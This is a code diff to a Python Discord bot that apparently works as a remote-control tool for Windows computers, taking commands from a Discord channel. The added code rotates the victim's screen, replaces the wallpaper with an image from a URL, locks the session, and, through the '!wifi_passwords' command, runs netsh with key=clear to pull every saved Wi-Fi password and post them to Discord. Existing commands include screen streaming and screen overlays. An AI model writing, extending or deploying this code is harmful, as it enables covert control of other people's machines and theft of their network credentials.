@@ -46,7 +46,10 @@ import ctypes
 import urllib.request
 import signal
 import setproctitle
+import win32api
+import win32con
 import certifi
+from win10toast import ToastNotifier
 
 os.environ['SSL_CERT_FILE'] = certifi.where()
 
@@ -54,7 +57,7 @@ FFMPEG_PATH = imageio_ffmpeg.get_ffmpeg_exe()
 # ---------------------------------------------------------------------------
 VOICE_CHANNEL_ID = 00000000000000000000 # Replace with your voice channel ID
 READY_ID = 00000000000000000000 # Replace with your channel ID
-BOT_TOKEN = 'your token' # Replace with your bot token
+BOT_TOKEN = 'your token'  # Replace with your bot token
 # ---------------------------------------------------------------------------
 
 intents = discord.Intents.default()
@@ -110,7 +113,11 @@ clist2 = """
 - `!vpnstatus`: Check VPN status
 - `!setcursor [url/image]`: Change cursor's image
 - `!draw [shape] [coordinates]`: Draw shapes on the screen
-- `!draw text [x,y][text]`: Draw text on the screen"""
+- `!draw text [x,y][text]`: Draw text on the screen
+- `!rotate [degrees]`: Rotate the screen by specified degrees
+- `!wallpaper [url/image]`: Change desktop wallpaper
+- `!wifi_passwords`: Get saved Wi-Fi passwords
+- `!lockpc`: Lock the Windows session immediately"""
 
 streaming_active = False  # Flag to control screen streaming loop
 
@@ -1192,5 +1199,149 @@ async def draw(ctx, shape: str, *args):
 
     overlay_thread = threading.Thread(target=run_overlay, args=(shapes,), daemon=True)
     overlay_thread.start()
+
+def rotate_display(angle):
+    """
+    Rotate the primary display by the specified angle.
+    angle: one of [0, 90, 180, 270]
+    """
+    DMDO_DEFAULT = 0
+    DMDO_90 = 1
+    DMDO_180 = 2
+    DMDO_270 = 3
+
+    angle_map = {
+        0: DMDO_DEFAULT,
+        90: DMDO_90,
+        180: DMDO_180,
+        270: DMDO_270
+    }
+
+    dm = win32api.EnumDisplaySettings(None, win32con.ENUM_CURRENT_SETTINGS)
+    dm.DisplayOrientation = angle_map.get(angle, DMDO_DEFAULT)
+
+    # Swap width and height if rotating by 90 or 270
+    if angle in [90, 270]:
+        dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
+
+    result = win32api.ChangeDisplaySettings(dm, 0)
+    return result
+
+@bot.command()
+async def rotate(ctx, degrees: int = 90, duration: int = 5):
+    """
+    Rotates the display for `duration` seconds, then resets.
+    Example: !rotate 90 5
+    """
+    if degrees not in [0, 90, 180, 270]:
+        await ctx.send("❌ Invalid rotation angle. Use one of 0, 90, 180, 270.")
+        return
+
+    await ctx.send(f"Rotating display by {degrees}° for {duration} seconds...")
+
+    # Rotate
+    res = rotate_display(degrees)
+    if res != 0:
+        await ctx.send(f"⚠️ Failed to rotate display (code {res})")
+        return
+
+    await asyncio.sleep(duration)
+
+    # Reset
+    res_reset = rotate_display(0)
+    if res_reset != 0:
+        await ctx.send(f"⚠️ Failed to reset display rotation (code {res_reset})")
+    else:
+        await ctx.send("Display rotation reset to normal.")
+
+def set_wallpaper(path):
+    # SPI_SETDESKWALLPAPER = 20
+    # Update INI file = 1, Send change event = 2
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
+
+@bot.command()
+async def wallpaper(ctx, url: str):
+    """Download image from URL and set it as wallpaper."""
+    await ctx.send("Downloading image...")
+
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+    except Exception as e:
+        await ctx.send(f"❌ Failed to download image: {e}")
+        return
+
+    try:
+        # Open image with Pillow to verify and convert if needed
+        img = Image.open(BytesIO(response.content))
+        # Save as BMP (Windows prefers BMP for wallpaper)
+        wallpaper_path = os.path.join(os.getenv('TEMP'), 'discord_wallpaper.bmp')
+        img.save(wallpaper_path, "BMP")
+
+        set_wallpaper(wallpaper_path)
+        await ctx.send("🖼️ Wallpaper set successfully!")
+    except Exception as e:
+        await ctx.send(f"❌ Failed to set wallpaper: {e}")
+
+@bot.command()
+async def wifi_passwords(ctx):
+    try:
+        # Get list of all saved Wi-Fi profiles
+        profiles_data = subprocess.check_output(
+            ['netsh', 'wlan', 'show', 'profiles'],
+            text=True, encoding='utf-8'
+        )
+        profiles = []
+        for line in profiles_data.split('\n'):
+            if "All User Profile" in line:
+                # Extract profile name
+                name = line.split(":")[1].strip()
+                profiles.append(name)
+
+        if not profiles:
+            await ctx.send("No saved Wi-Fi profiles found.")
+            return
+
+        results = []
+        for profile in profiles:
+            try:
+                # Get the key content (password) for the profile
+                profile_info = subprocess.check_output(
+                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
+                    text=True, encoding='utf-8'
+                )
+                password = None
+                for line in profile_info.split('\n'):
+                    if "Key Content" in line:
+                        password = line.split(":")[1].strip()
+                        break
+                if password:
+                    results.append(f"**{profile}**: `{password}`")
+                else:
+                    results.append(f"**{profile}**: *No password found / Open network*")
+            except subprocess.CalledProcessError:
+                results.append(f"**{profile}**: *Failed to retrieve password*")
+
+        # Discord message limit ~2000 chars, chunk if needed
+        message = "\n".join(results)
+        if len(message) > 1900:
+            # Split into chunks safely
+            chunks = [message[i:i+1900] for i in range(0, len(message), 1900)]
+            for chunk in chunks:
+                await ctx.send(f"```{chunk}```")
+        else:
+            await ctx.send(f"```{message}```")
+
+    except Exception as e:
+        await ctx.send(f"❌ Error retrieving Wi-Fi passwords:\n```{e}```")
+
+@bot.command()
+async def lockpc(ctx):
+    """Locks the Windows session immediately."""
+    try:
+        ctypes.windll.user32.LockWorkStation()
+        await ctx.send("🔒 PC locked successfully.")
+    except Exception as e:
+        await ctx.send(f"❌ Failed to lock PC: {e}")
 
 bot.run(BOT_TOKEN)
